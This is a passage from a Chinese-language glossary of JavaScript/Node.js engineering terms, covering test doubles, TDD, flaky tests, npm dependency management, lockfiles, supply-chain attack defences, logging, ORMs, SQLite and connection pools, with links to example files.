分支覆盖率专门回答「**控制流的每个出口都走过了吗**」：`if/else` 的两条路、`switch` 的每个 `case` 加 `default`、`a && b` 的短路两侧、`try/catch` 的 `catch`、可选链后 `??` 的两侧。它比语句覆盖更严格，因为一个 `if` 只有一行语句，走真分支就算语句覆盖 100%，但假分支可能从未执行。关键细节：未覆盖的分支往往对应**错误处理与兜底路径**——这些路径恰恰是线上最容易出事的，因为平时没人走；所以「分支覆盖率低」通常意味着「异常路径没测」。

**常见误解**：以为短路表达式不算分支。当 `a` 为假时右侧根本不会执行，这一侧同样是需要覆盖的分支。

也见 [Test Coverage（测试覆盖率）](#test-coverage测试覆盖率)、[Unit Test（单元测试）](#unit-test单元测试)。

示例：[`28_testing/08_test_coverage_concept.js`](28_testing/08_test_coverage_concept.js)

### TDD（测试驱动开发，Test-Driven Development）

TDD 是一种**先写测试、再写实现**的开发节奏：在写下任何产品代码之前，先写一条会失败的测试，用它把「我要的行为」表达成可执行的形式，再写刚好让它通过的实现，最后在测试的保护下重构。它的价值不在「测试」，而在**设计**——因为必须让测试能独立调用被测代码，你被迫写出低耦合、依赖可注入的结构；同时你永远有一份「已完成」的清单，不会写着写着跑偏。关键细节：TDD 的步子必须小（一次只加一条测试），否则会退化成「先写完实现再补测试」；对于接口未定、探索性强的代码，TDD 反而不是最合适的起点。

**常见误解**：以为 TDD 能保证代码正确。它保证的是「你写下的预期都被满足」，如果预期本身错了，测试全绿也照样是错的。

也见 [Red-Green-Refactor（红-绿-重构）](#red-green-refactor红-绿-重构)、[Unit Test（单元测试）](#unit-test单元测试)、[Dependency Injection（依赖注入）](#dependency-injection-di依赖注入)。

示例：[`28_testing/09_tdd_workflow.js`](28_testing/09_tdd_workflow.js)

### Red-Green-Refactor（红-绿-重构）

这是 TDD 的三拍循环：**红**——写一条失败的测试，确认它确实因为「功能没实现」而失败（如果它一写就绿，说明这条测试没在验证任何东西）；**绿**——用最简单甚至有点笨的写法让测试通过，此阶段唯一目标是从红变绿，不追求优雅；**重构**——测试全绿的前提下清理实现，改结构不改行为，测试是你的安全网。关键细节：三步都不可省，尤其「先确认红」常被跳过，导致测试写错方向（比如断言写反、根本没调用到被测代码）却一路绿灯；重构阶段必须保持测试绿，一旦变红立刻回退。

**常见误解**：以为「绿」阶段的代码可以直接进主干。绿只是阶段性成果，跳过重构会迅速积累出「测试齐全但代码一团糟」的代码库。

也见 [TDD（测试驱动开发）](#tdd测试驱动开发test-driven-development)、[Regression Test（回归测试）](#regression-test回归测试)。

示例：[`28_testing/09_tdd_workflow.js`](28_testing/09_tdd_workflow.js)

### Snapshot Testing（快照测试）

快照测试首次运行时把实际输出**序列化存成一份基准文件**（快照），之后每次运行都与它比对：一致则通过，不一致则失败并展示差异，由你决定是「代码改错了」还是「输出确实变了，更新快照」。它最适合输出结构复杂、逐字段断言不现实的场景，比如序列化后的配置对象、渲染出的 HTML 结构。关键细节：快照必须**随代码一起提交并进入代码评审**——否则「随手更新快照」会变成掩盖回归的常规操作，让快照测试彻底失效；同时要避免在快照里包含时间戳、随机数、绝对路径这些每次都不同的内容。

**常见误解**：以为快照能替代有意设计的断言。快照只回答「和上次一样吗」，回答不了「对不对」；把它用在核心业务逻辑上，等于把测试的判据交给了上一次运行的自己。

也见 [Regression Test（回归测试）](#regression-test回归测试)、[Vitest（Vitest 与 Jest）](#vitestvitest-与-jest)。

示例：[`28_testing/11_snapshot_testing.js`](28_testing/11_snapshot_testing.js)

### Regression Test（回归测试）

回归测试用来回答「**这次改动有没有把原本好用的功能弄坏**」。「回归（regression）」指曾经正常的行为退回到了错误状态。它未必是一类特殊的测试写法，更多是一种**用途定位**：任何在修 bug 之后补写、用来锁住该 bug 的测试都是回归测试（先复现、再修复、再留下测试），任何在每次提交都重跑的既有测试套件也在承担回归职责。关键细节：修 bug 时**必须先写一条能复现 bug 的失败测试再动手修**——否则你无法证明自己修的是这个 bug，也无法阻止它再次出现。

**常见误解**：以为「测试跑通了就没有回归」。测试只覆盖它断言过的部分，没写断言的行为照样能悄悄变坏。

也见 [TDD（测试驱动开发）](#tdd测试驱动开发test-driven-development)、[Smoke Test（冒烟测试）](#smoke-test冒烟测试)、[Test Coverage（测试覆盖率）](#test-coverage测试覆盖率)。

示例：[`28_testing/01_why_testing.js`](28_testing/01_why_testing.js)

### Flaky Test（不稳定测试）

不稳定测试指**同一份代码、同样的环境，有时通过有时失败**的测试。它比一直失败的测试更危险：团队会学会「重跑一次就好了」，于是真正的回归被当作噪声忽略。常见成因是时间（依赖真实时钟或固定 `setTimeout`）、并发与顺序（用例间共享状态）、外部依赖（网络、第三方服务）、未等待的异步操作、以及动画/布局的时序。关键细节：处理流程是「先隔离，再修或删」——把它单独跑一百次确认不稳定，然后找出不确定源（注入可控时钟、等待条件而非固定延时、彻底清理共享状态）；如果实在无法稳定且价值不高，**删掉**比留着更好。

**常见误解**：以为「加个重试就好了」。自动重试只是把问题藏起来，还会成倍拉长流水线时间。

也见 [Test Isolation（测试隔离）](#test-isolation测试隔离)、[End-to-End Test / E2E（端到端测试）](#end-to-end-test-e2e端到端测试)。

示例：[`28_testing/12_test_pyramid_and_e2e.js`](28_testing/12_test_pyramid_and_e2e.js)

### Testing Async Code（异步代码测试）

测试异步逻辑的核心难点是「**测试函数可能在回调/Promise 结算之前就返回了**」，此时运行器认为测试通过——这是最典型的假通过。正确做法是让测试函数本身 `async` 并 `await` 被测 Promise，或者显式 `return` 那个 Promise；断言「会拒绝」要用专门的 API（`assert.rejects`/`expect(...).rejects`）而不是把 `try/catch` 写反。关键细节：还要处理**永远不会结算**的 Promise——为用例设置超时（`node:test` 的 `{ timeout }`、Vitest 的 `testTimeout`），否则挂住的是整个流水线；定时器相关的逻辑最好使用可控时钟或把「等待」注入进来，避免真的 `sleep` 三秒。

**常见误解**：以为 `await` 了被测函数就一定测到了。如果被 `await` 的函数内部又启动了未被追踪的异步任务（fire-and-forget），测试仍可能在它完成前结束。

也见 [Test Isolation（测试隔离）](#test-isolation测试隔离)、[Flaky Test（不稳定测试）](#flaky-test不稳定测试)、[Assertion（断言）](#assertion断言)。

示例：[`28_testing/06_testing_async_code.js`](28_testing/06_testing_async_code.js)

### Test Double（测试替身）

测试替身是「**在测试中替代真实协作者的任何东西**」的总称，借自电影里的「替身演员」比喻。它包含五种常见形态：**dummy**（只是占位、从不被真正使用）、**stub**（返回预设值）、**spy**（记录调用事实）、**mock**（预设期望并自行判定成败）、**fake**（可工作的简化实现）。为什么要用它？因为真实的协作者可能很慢（数据库）、不稳定（第三方 API）、难以触发（磁盘写满、系统时间）、或根本不存在（尚未实现的模块）。关键细节：替身是**有代价**的——它把「真实协作方的行为」换成了「你以为的行为」，替身写错时测试会愉快地通过而线上照样炸，所以替身应尽量只用在系统边界上。

**常见误解**：把这几个词当同义词混用（尤其是 mock 与 stub）。术语混乱会导致沟通时说的不是一件事，本节把它们拆开说明。

也见 [Mock（模拟对象）](#mock模拟对象)、[Stub（桩）](#stub桩)、[Spy（间谍）](#spy间谍)、[Fake（伪造实现）](#fake伪造实现)。

示例：[`28_testing/05_mocking_basics.js`](28_testing/05_mocking_basics.js)

### Mock（模拟对象）

Mock 是**预设了「应该被怎样调用」并据此自动判定成败**的替身：你对它写下期望（被调用一次、参数是 `{id: 1}`、携带某个头部），测试结束时由它来宣布「期望满足／未满足」。它验证的是**交互行为**（对象之间有没有按约定通信），而 stub 验证的是**状态**（拿到返回值后结果对不对）。关键细节：mock 的期望写得太细会把测试与实现细节焊死——重构时明明行为没变，测试却成片变红；因此优先断言「我关心的那次关键交互」，而不是把所有调用逐一录下来。

**常见误解**：把「mock」当成「一切替身」的口语说法，于是说「我 mock 了这个函数返回 42」时，其实指的是 stub。

也见 [Stub（桩）](#stub桩)、[Spy（间谍）](#spy间谍)、[Test Double（测试替身）](#test-double测试替身)。

示例：[`28_testing/05_mocking_basics.js`](28_testing/05_mocking_basics.js)

### Stub（桩）

Stub 是**只负责「返回预设结果」的替身**：让某个依赖固定返回一个成功响应、一个 500、一个空数组或抛出一个错误，从而把被测代码推到你想验证的分支上。它不做任何判定，只提供**受控的输入**。典型用途是制造那些真实环境里很难出现的场景——网络超时、第三条记录损坏、余额不足。关键细节：stub 定义了「世界是怎样的」，因此要**写进断言的语境里**（这条用例在验证「上游 500 时不应写库」），否则别人读测试时会以为这是在描述真实依赖的行为。

**常见误解**：把 stub 当成 mock。判断标准很简单——**它有没有自己的期望判定逻辑**：只喂数据的是 stub，会主动判定调用是否合规的是 mock。

也见 [Mock（模拟对象）](#mock模拟对象)、[Fake（伪造实现）](#fake伪造实现)、[Test Double（测试替身）](#test-double测试替身)。

示例：[`28_testing/05_mocking_basics.js`](28_testing/05_mocking_basics.js)

### Spy（间谍）

Spy 是**记录「被调用过几次、用什么参数、返回了什么、抛了什么」的替身**，通常不改变原函数的实现（可以「包住真实函数」来观察它）。它的使用方式与断言相反：先执行代码，再回过头检查记录——`expect(spy).toHaveBeenCalledWith(...)`。关键细节：spy 常用来验证**副作用**（日志被写入、事件被派发、回调被调用），这类行为没有返回值可断言；`vi.fn()`/`jest.fn()` 造出的其实是「同时具备 spy 与 stub 能力」的万能替身，可以通过 `mockImplementation` 再给它行为。

**常见误解**：以为 spy 会替换掉真实实现。包装式 spy 默认会**原样调用**真实函数，因此它通常不改变被测代码的行为，只是旁观。

也见 [Mock（模拟对象）](#mock模拟对象)、[Stub（桩）](#stub桩)、[Test Double（测试替身）](#test-double测试替身)。

示例：[`28_testing/05_mocking_basics.js`](28_testing/05_mocking_basics.js)

### Fake（伪造实现）

Fake 是**具备真实可工作逻辑、但走了捷径**的替身：内存数据库替代真实数据库、内存队列替代消息中间件、假时钟替代 `Date`。它与 stub 的关键区别在于「**真的有行为**」——同一个 fake 可以被几十条用例复用，而不必为每条用例预设返回值。关键细节：fake 本身也需要测试（否则你测的是「假实现有 bug」还是「真代码有 bug」就分不清了），且它与真实实现的**语义差异**必须清楚——内存数据库没有事务隔离、没有约束冲突，这些差异会让通过了测试的代码在真实环境失效。

**常见误解**：以为 fake 一定不如真依赖。对大多数业务测试而言，可控的 fake 比不稳定的真实依赖更有价值；关键是别在需要验证集成契约的地方用它。

也见 [Stub（桩）](#stub桩)、[Test Double（测试替身）](#test-double测试替身)、[Integration Test（集成测试）](#integration-test集成测试)。

示例：[`28_testing/13_module_mocking.js`](28_testing/13_module_mocking.js)

### Module Mocking（模块级 mock）

模块级 mock 指**在导入层面替换整个模块**（`vi.mock('./db', ...)`、`jest.mock`、`mock.module()`），让被测代码里的 `import` 拿到替身而不是真货。它很有诱惑力，但也最容易出问题：ESM 的绑定是**只读且静态提升**的，模块在 `import` 语句求值时就已经被加载，测试文件里后写的替换往往根本没生效；同时「替换整个模块」通常说明被测代码**直接依赖了具体实现**，而不是依赖一个可注入的抽象。关键细节：正解通常是**依赖注入**——让被测函数把依赖当参数（或构造函数参数）接进来，测试直接传替身，无需触碰模块系统；只有在第三方库无法改造时才退回到模块 mock。

**常见误解**：以为「打不到内部 import」是运行器的 bug。这是 ESM 的语义设计，不是缺陷；也见本仓库专门讨论这一点的示例。

也见 [Dependency Injection（依赖注入）](#dependency-injection-di依赖注入)、[Fake（伪造实现）](#fake伪造实现)、[Mock（模拟对象）](#mock模拟对象)。

示例：[`28_testing/13_module_mocking.js`](28_testing/13_module_mocking.js)

### Test Dependency Injection（测试中的依赖注入）

依赖注入在测试语境下只有一个目的：**让被测代码不再自己创建依赖，而是从外部接收依赖**，于是测试可以在生产代码用真实数据库、测试代码用内存 fake 的情况下跑同一份逻辑。它把「测试替身」从「到处打补丁」变成「一次传参」。关键细节：注入点是构造函数参数、函数参数或配置对象；注入的是**抽象**（约定好的接口形状）而不是具体类，这样测试才能用任意对象顶上；这也是 TDD 会自然逼出的设计——因为写测试时你会立刻发现「这个依赖我拿不到」。

**常见误解**：以为 DI 必须引入框架或装饰器。在 JS 里，**把依赖当参数传进去**就已经是依赖注入了，框架只是替你自动装配。

也见 [Dependency Injection（依赖注入）](#dependency-injection-di依赖注入)、[Module Mocking（模块级 mock）](#module-mocking模块级-mock)、[Test Double（测试替身）](#test-double测试替身)。

示例：[`30_design_patterns/19_dependency_injection.js`](30_design_patterns/19_dependency_injection.js)、[`28_testing/13_module_mocking.js`](28_testing/13_module_mocking.js)

## 第三方库与依赖

### Dependency（依赖）

依赖指「你的项目为正常运行而需要的**外部代码**」。它带来价值（不必重造轮子）也带来成本：体积、安全面、维护负担、许可证义务与升级风险。关键细节：依赖分运行时依赖与开发期依赖、直接依赖与传递依赖，它们的风险与升级策略完全不同；每一次添加依赖都是一次**长期承诺**——你之后要跟着它升版本、修安全通告、处理破坏性变更，因此「这个功能我能不能自己写 30 行」永远是值得先问的问题。

**常见误解**：以为「不加依赖 = 不专业」。恰恰相反，成熟的工程会把依赖清单当作需要定期审计的资产。

也见 [Direct vs Transitive Dependency（直接依赖与传递依赖）](#direct-vs-transitive-dependency直接依赖与传递依赖)、[Library Selection（第三方库选型）](#library-selection第三方库选型)。

示例：[`29_npm_libraries/12_library_selection.js`](29_npm_libraries/12_library_selection.js)

### Direct vs Transitive Dependency（直接依赖与传递依赖）

**直接依赖**是你在 `package.json` 里亲手写下的包；**传递依赖**是这些包的依赖的依赖——你从未选择过它们，但它们的代码同样会跑在你的机器上。传递依赖的数量可能远超直接依赖（一个 5KB 的包拖进四十个包并不罕见），因此「依赖体积」必须看**传递依赖闭包**而不是包自身的体积。关键细节：传递依赖是你**无法直接控制版本**的部分，安全通告里出问题的往往正是它们；`npm ls <包名>` 可以查出「是谁把某个包引进来的」，这是排查体积膨胀与版本冲突的第一条命令。

**常见误解**：只看 `package.json` 就以为掌握了项目的依赖全貌。真正的依赖图要大得多，`node_modules` 才是它的物化形态。

也见 [Dependency（依赖）](#dependency依赖)、[Phantom Dependency（幽灵依赖）](#phantom-dependency幽灵依赖)、[Dependency Hell（依赖地狱）](#dependency-hell依赖地狱)。

示例：[`29_npm_libraries/12_library_selection.js`](29_npm_libraries/12_library_selection.js)

### dependencies / devDependencies / peerDependencies（三类依赖声明）

`package.json` 用三个字段区分依赖的**用途与生命周期**。`dependencies`：运行时需要，会随你的包一起被安装到使用者的项目里（如 `express`）；`devDependencies`：只在开发/构建/测试时需要，使用者装你的包时不会安装（如 `vitest`、`eslint`）；`peerDependencies`：声明「我要求宿主环境提供某个版本的这个包」，但**不替你安装**，用于插件与框架生态（如组件库要求 `react ^18`）。关键细节：分错的代价很实际——把只用于测试的包写进 `dependencies` 会让所有使用者多装一堆东西（并扩大攻击面）；把运行时需要的包写进 `devDependencies` 则会让别人装完就报「模块找不到」。`peerDependencies` 的哲学是「共享同一份实例」，避免 React 被装成两份导致 hooks 失效。

**常见误解**：以为 `peerDependencies` 也会被自动装上。现代 npm 会尝试自动安装并打印冲突警告，但它的**语义**始终是「由使用者提供」。

也见 [Dependency（依赖）](#dependency依赖)、[Semantic Versioning / semver（语义化版本）](#semantic-versioning-semver语义化版本)。

示例：[`29_npm_libraries/12_library_selection.js`](29_npm_libraries/12_library_selection.js)

### Semantic Versioning / semver（语义化版本）

semver 用 `主版本.次版本.修订号`（`MAJOR.MINOR.PATCH`）三个数字约定版本变化对使用者意味着什么：**MAJOR** 升位代表有不兼容的破坏性变更，**MINOR** 升位是向后兼容的新功能，**PATCH** 升位是向后兼容的缺陷修复。它本质上是一份**承诺**，而不是数字规律：`1.2.3` 能升级到 `1.9.0` 是因为作者承诺没破坏兼容性。关键细节：`0.x.y` 是特例——按约定 `0` 开头的版本 API 尚未稳定，**次版本号升位就可能包含破坏性变更**，所以 `^0.2.1` 的行为与 `^1.2.1` 不同；此外 `1.0.0-beta.1` 这类预发布版本在版本范围匹配上有专门规则，通常不会被 `^1.0.0` 匹配到。

**常见误解**：以为 semver 能防住所有升级问题。承诺是作者单方面做出的，现实中「补丁版本里的行为变化」与「悄悄放宽依赖范围」都不罕见——这正是锁文件存在的理由。

也见 [Version Range（版本范围）](#version-range版本范围)、[Lockfile（锁文件）](#lockfile锁文件)、[Supply Chain Attack（供应链攻击）](#supply-chain-attack供应链攻击)。

示例：[`29_npm_libraries/12_library_selection.js`](29_npm_libraries/12_library_selection.js)

### Version Range（版本范围）

版本范围写在 `package.json` 的版本值里，决定「`npm install` 时允许装到哪个版本」。最常用两个前缀：`^1.2.3`（脱字号）允许升到**不改变最左侧非零数字**的版本，即 `>=1.2.3 <2.0.0`；`~1.2.3`（波浪号）只允许升**修订号**，即 `>=1.2.3 <1.3.0`。此外还有 `1.2.x`、`>=1.2.3 <2`、`*`（任意版本）与 `latest` 等写法。关键细节：范围越宽，越容易在不改代码的情况下悄悄换掉依赖实现——`^` 是社区默认（因为相信 semver），`~` 更保守，精确锁死 `1.2.3` 最保守但会让你错过安全修复；`*` 与 `latest` 在库中基本等同于事故。

**常见误解**：以为 `^1.2.3` 表示「会装 1.2.3」。它表示「至少 1.2.3，且允许升到 1.x 的最新版」——**实际装到哪一版由锁文件决定**。

也见 [Semantic Versioning / semver（语义化版本）](#semantic-versioning-semver语义化版本)、[Lockfile（锁文件）](#lockfile锁文件)。

示例：[`32_security_and_best_practices/14_supply_chain_security.js`](32_security_and_best_practices/14_supply_chain_security.js)

### Lockfile（锁文件）

锁文件（`package-lock.json`、`yarn.lock`、`pnpm-lock.yaml`）记录**上一次安装时实际装上的每一个包的精确版本与完整性校验值**，包括全部传递依赖。它解决的核心问题是**可复现性**：`package.json` 里的 `^1.2.3` 是范围，不同时间、不同机器上装出来的版本可能不同，而锁文件把「这次装了什么」钉死，让同事、CI、生产环境装出完全一致的依赖树。关键细节：锁文件必须**提交进版本库**；它同时是供应链防线的一环（记录了包的哈希），可以在 `npm ci` 时校验下载内容是否被篡改。

**常见误解**：以为「锁文件冲突就删掉重新生成」。这等于放弃可复现性，还会把大量无关依赖顺手升级；正确做法是解决冲突或按需重新解析并 review 差异。

也见 [npm ci](#npm-ci-与-npm-installnpm-ci-vs-npm-install)、[Supply Chain Attack（供应链攻击）](#supply-chain-attack供应链攻击)。

示例：[`32_security_and_best_practices/14_supply_chain_security.js`](32_security_and_best_practices/14_supply_chain_security.js)

### npm ci 与 npm install（npm ci vs npm install）

两者都能装依赖，语义却相反。`npm install` 会**按 `package.json` 的范围解析依赖**，允许把包升到范围内最新的版本，并据此**改写锁文件**——适合开发机上引入新依赖。`npm ci` 则**严格按锁文件安装**，完全不解析范围，如果锁文件与 `package.json` 不一致会直接报错退出，而且它会先清空 `node_modules` 再装，干净且快。关键细节：CI/CD 流水线**必须用 `npm ci`**——否则每次构建可能装上不同的传递依赖，「本地能跑、线上不行」的诡异问题多半源于此；反过来，在开发机上不该用 `npm ci` 来添加依赖，因为它不会更新锁文件。

**常见误解**：以为两者只差速度。它们对依赖图的确定性保证完全不同，这才是关键区别。

也见 [Lockfile（锁文件）](#lockfile锁文件)、[Version Range（版本范围）](#version-range版本范围)。

示例：[`32_security_and_best_practices/14_supply_chain_security.js`](32_security_and_best_practices/14_supply_chain_security.js)

### Phantom Dependency（幽灵依赖）

幽灵依赖指**你的代码 import 了一个并没有写进自己 `package.json` 的包**，只是因为它恰好被别的依赖「提升（hoist）」到了顶层 `node_modules` 而能用。npm 为了去重会把依赖尽量拍平到顶层，于是 `require('lodash')` 可能在你没声明 lodash 的情况下也能成功。这非常危险：一旦那个间接引入它的包升级、换实现或被你删除，你的代码会在**没有任何改动的情况下突然崩掉**；换用 pnpm 这类严格隔离的包管理器时，同样的代码立刻报错。关键细节：防御手段是「只 import 自己声明过的包」，并用严格模式的包管理器或 lint 规则来暴露违规。

**常见误解**：以为「能 import 就说明可以用」。在扁平化安装的 `node_modules` 里，能 import 只是巧合。

也见 [Direct vs Transitive Dependency（直接依赖与传递依赖）](#direct-vs-transitive-dependency直接依赖与传递依赖)、[Dependency Hell（依赖地狱）](#dependency-hell依赖地狱)。

示例：[`29_npm_libraries/12_library_selection.js`](29_npm_libraries/12_library_selection.js)

### Dependency Hell（依赖地狱）

依赖地狱指**依赖之间版本要求互相冲突**导致的无解状态：A 要求 `lib ^1`，B 要求 `lib ^2`，两者无法共存于同一份实例。典型症状是「装上了但运行时报奇怪的错」「明明升级了却还是旧行为」「同一个包存在多份副本导致 `instanceof` 失效」。关键细节：包管理器用「嵌套安装同一包的不同版本」来缓解，代价是体积膨胀与实例分裂；npm 的 `overrides`、pnpm 的 `resolutions` 可以强制统一版本，但那是把冲突按下去而不是解决它；根治办法是尽早升级掉那些锁死老版本依赖的包。

**常见误解**：以为「删除 `node_modules` 和锁文件重装」能解决依赖地狱。它会暂时让安装成功，却让版本变得不可复现，问题下次还会以别的形式回来。

也见 [Phantom Dependency（幽灵依赖）](#phantom-dependency幽灵依赖)、[Direct vs Transitive Dependency（直接依赖与传递依赖）](#direct-vs-transitive-dependency直接依赖与传递依赖)。

示例：[`29_npm_libraries/12_library_selection.js`](29_npm_libraries/12_library_selection.js)

### Supply Chain Attack（供应链攻击）

供应链攻击指**攻击者不直接攻破你的系统，而是攻破你所依赖的上游**：劫持维护者账号发布带恶意代码的新版本、在 `postinstall` 脚本里执行窃密逻辑、仿冒包名（typosquatting）、或利用依赖混淆把内网包名抢注到公共仓库。它的效力来自「信任传递」——你信任 A，A 信任 B，最终 B 的恶意代码在你的生产环境里以完整权限运行。关键细节：防御是多层组合——提交并用 `npm ci` 复现锁文件、用 `npm audit` 跟踪已知漏洞、安装脚本管控（`--ignore-scripts`）、依赖数量最小化、SRI 保护第三方脚本；同时要认识到**没有银弹**，这类攻击的平均发现周期以月计。

**常见误解**：以为「我只用大厂维护的热门包就安全」。热门包与维护者账号恰恰是收益最高的攻击目标，历史事件多出于此。

也见 [Typosquatting / Dependency Confusion（仿冒包名与依赖混淆）](#typosquatting-dependency-confusion仿冒包名与依赖混淆)、[SRI（子资源完整性）](#sri-subresource-integrity子资源完整性)、[Lockfile（锁文件）](#lockfile锁文件)。

示例：[`32_security_and_best_practices/14_supply_chain_security.js`](32_security_and_best_practices/14_supply_chain_security.js)

### Library Selection（第三方库选型）

选型是在「自己写」与「引入依赖」之间做的一次成本权衡，评估维度通常有六项：**体积**（压缩后体积 + 传递依赖闭包 + 是否支持 tree-shaking）、**维护状态**（最近提交、issue 响应、发版节奏）、**类型支持**（自带 `types` 还是需要 `@types`）、**许可证**（MIT/Apache 友好，GPL 类可能传染）、**安全记录**、以及**替换成本**（API 是否容易抽象遮蔽）。关键细节：优先选「小而专注」的库（dayjs 之于 moment、zod 之于重量级校验框架），并对关键依赖做一层**薄封装**——这样将来替换时只改一个文件；同时要问「这个功能我用 30 行标准 API 能不能写出来」。

**常见误解**：只看 GitHub star 数。star 高不等于维护活跃，也完全不能反映体积、许可证与安全记录。

也见 [Dependency（依赖）](#dependency依赖)、[Supply Chain Attack（供应链攻击）](#supply-chain-attack供应链攻击)。

示例：[`29_npm_libraries/12_library_selection.js`](29_npm_libraries/12_library_selection.js)

### Structured Logging（结构化日志）

结构化日志指**以「带字段的结构化数据」而不是拼接好的字符串**来记录事件：输出 `{"level":"info","msg":"user login","userId":42,"durationMs":18}` 而不是 `"user 42 login in 18ms"`。为什么重要？因为纯文本日志只能靠正则去猜，而结构化日志可以直接按字段查询、聚合、告警——`level=error AND service=api` 变成一条查询语句。关键细节：主流方案是**每行一条 JSON**（NDJSON，也叫 JSON Lines），便于日志系统逐行解析与流式采集；同时要遵循**字段命名约定**（`level`/`time`/`msg`/`traceId`）并保持稳定，字段名朝令夕改会让历史日志无法与新的聚合查询对齐。

**常见误解**：以为「用 `console.log` 打印一个对象」就是结构化日志。Node 的 `console.log` 输出的是**给人和调试器看的格式**（多行、非严格 JSON、带颜色），机器无法可靠解析。

也见 [Log Level（日志级别）](#log-level日志级别)、[Log Collection（日志采集）](#log-collection日志采集)、[Sensitive Data Exposure / Log Redaction（敏感信息泄漏与日志脱敏）](#sensitive-data-exposure-log-redaction敏感信息泄漏与日志脱敏)。

示例：[`29_npm_libraries/14_logging.js`](29_npm_libraries/14_logging.js)

### Log Level（日志级别）

日志级别是一套**按严重程度排序的过滤开关**，常见从低到高为 `trace`/`debug`/`info`/`warn`/`error`/`fatal`。运行环境通过设定一个阈值来决定「只输出不低于该级别的日志」：开发环境用 `debug` 看细节，生产环境用 `info` 甚至 `warn` 控制成本与噪声。关键细节：级别应当有**明确契约**——`error` 表示「需要人介入」，`warn` 表示「可能有问题但系统仍可用」，`info` 表示「值得记录的正常业务事件」，`debug` 表示「排查时才有用的细节」；把「可预期的用户输入错误」（如密码错误）记成 `error` 会让告警疲于奔命，最终没人看。

**常见误解**：以为级别越高越重要所以要「多打 error」。级别混乱的日志系统里，真正的错误会被淹没在成千上万条伪 error 中。

也见 [Structured Logging（结构化日志）](#structured-logging结构化日志)、[Log Collection（日志采集）](#log-collection日志采集)。

示例：[`29_npm_libraries/14_logging.js`](29_npm_libraries/14_logging.js)

### Log Collection（日志采集）

日志采集指把应用产出的日志**汇总到一处可查询、可告警的存储**（进程 stdout → 采集代理 → 日志服务或 ELK/Loki）。它与「打印日志」是两件事：打印只是把行写到标准输出，采集负责缓冲、批量化、加元数据（主机、容器 ID、时间戳）、转发与保留策略。关键细节：容器化环境的最佳实践是**应用只写 stdout/stderr，不自己写文件**——由运行时负责收集，这样应用不必关心落盘、切割与轮转；同时要通过 `traceId` 之类的关联字段把分散在多台机器上的同一次请求日志串起来，否则分布式系统里的日志等于一堆孤立的碎片。

**常见误解**：以为「日志打出来了就等于能查到」。没有采集链路的日志在容器重启后就永久消失了。

也见 [Structured Logging（结构化日志）](#structured-logging结构化日志)、[Sensitive Data Exposure / Log Redaction（敏感信息泄漏与日志脱敏）](#sensitive-data-exposure-log-redaction敏感信息泄漏与日志脱敏)。

示例：[`29_npm_libraries/14_logging.js`](29_npm_libraries/14_logging.js)

### ORM（对象关系映射，Object-Relational Mapping）

ORM 把**数据库的表和行映射成编程语言里的对象**，让你用方法调用而不是拼 SQL 来读写数据（`user.save()` 对应 `UPDATE`，`User.findAll({ where: {...} })` 对应 `SELECT`）。它的价值是消除样板代码、提供类型提示、内置迁移与关联加载；代价是**抽象泄漏**——复杂查询最终仍要甩回原生 SQL，而 ORM 自动生成的低效查询（典型是 N+1：查 100 个用户后又为每个用户发一条查订单的语句）会成为性能黑洞。关键细节：ORM 不是必需品，轻量项目直接用驱动（如 `node:sqlite`）写 SQL 往往更透明；用 ORM 时一定要开启查询日志，看清它到底发了什么 SQL。

**常见误解**：以为用了 ORM 就天然安全。ORM 确实让参数化查询成为默认，但 `where` 里拼字符串、或用原生查询接口时照样能写出 SQL 注入。

也见 [SQLite（SQLite）](#sqlitesqlite)、[Repository Pattern（仓储模式）](#repository-pattern仓储模式)、[SQL Injection（SQL 注入）](#sql-injectionsql-注入)。

示例：[`29_npm_libraries/15_database_and_orm.js`](29_npm_libraries/15_database_and_orm.js)

### SQLite（SQLite）

SQLite 是一个**无服务器、零配置、单文件的嵌入式关系数据库**：整个库就是一个 `.db` 文件，没有独立进程、没有网络协议，直接以函数调用方式读写磁盘。Node.js 通过内置的 `node:sqlite` 模块即可使用，无需任何第三方依赖。它的适用面比很多人以为的宽——从手机 App、桌面软件到中型网站都能胜任；局限是**写并发**：默认同一时刻只允许一个写事务，高并发写入场景需要换客户端/服务器型数据库。关键细节：SQLite 的并发默认靠文件锁实现，开启 WAL 模式可以显著改善读写并发；它同样是 SQL 注入的受害者，防御方式与其它数据库一致。

**常见误解**：以为「嵌入式 + 单文件 = 玩具」。世界上的 SQLite 实例数量远超其它所有数据库的总和。

也见 [ORM（对象关系映射）](#orm对象关系映射object-relational-mapping)、[Connection Pool（连接池）](#connection-pool连接池)。

示例：[`29_npm_libraries/15_database_and_orm.js`](29_npm_libraries/15_database_and_orm.js)

### Repository Pattern（仓储模式）

仓储模式在业务逻辑与数据访问之间加一层**面向领域的接口**：业务代码只说 `userRepo.findById(id)` 或 `orderRepo.save(order)`，不关心底层是 SQL、是内存数组还是远程 API。它带来两个直接收益——**可测试性**（测试注入内存实现即可，不需要数据库）与**可替换性**（换存储只改一处）。关键细节：仓储应当返回**领域对象**而不是数据库行，方法应当以业务语义命名（`findActiveUsers()` 而不是 `query("SELECT * ...")`）；要避免把仓储写成「数据库的薄包装」——如果它的方法名和 SQL 关键字一一对应，那这层抽象没有创造任何价值。

**常见误解**：以为 Repository 就是 ORM 的别名。ORM 是**技术手段**（映射工具），Repository 是**架构边界**（谁有权访问数据），可以在没有 ORM 的情况下手写仓储。

也见 [ORM（对象关系映射）](#orm对象关系映射object-relational-mapping)、[Dependency Injection（依赖注入）](#dependency-injection-di依赖注入)、[DTO（数据传输对象）](#dto数据传输对象data-transfer-object)。

示例：[`29_npm_libraries/15_database_and_orm.js`](29_npm_libraries/15_database_and_orm.js)、[`30_design_patterns/21_architecture_patterns.js`](30_design_patterns/21_architecture_patterns.js)

### Connection Pool（连接池）

连接池预先维护一批**已建立的数据库连接并循环复用**，避免每次查询都经历「建立 TCP/握手/认证/关闭」的完整开销。它的存在是因为连接是昂贵资源：建立一次连接可能耗时几十毫秒，而一条查询只需几毫秒——不复用的话，连接开销会完全压过业务本身。关键细节：池的大小需要与**数据库的最大连接数**一起规划，池总和超过数据库上限会直接把数据库打垮；池中连接要能检测失效并重建（数据库重启、空闲超时都会让连接变成坏连接），归还连接必须放在 `finally` 里，否则一次异常就会永久漏掉一个连接直到池枯竭。

**常见误解**：以为池越大越好。过大的池会增加数据库上下文切换与内存压力，反而降低总吞吐，通常每实例十几到几十条就够了。

也见 [SQLite（SQLite）](#sqlitesqlite)、[Circuit Breaker（熔断器）](#circuit-breaker熔断器)。

示例：[`29_npm_libraries/15_database_and_orm.js`](29_npm_libraries/15_database_and_orm.js)

### Retry（重试）

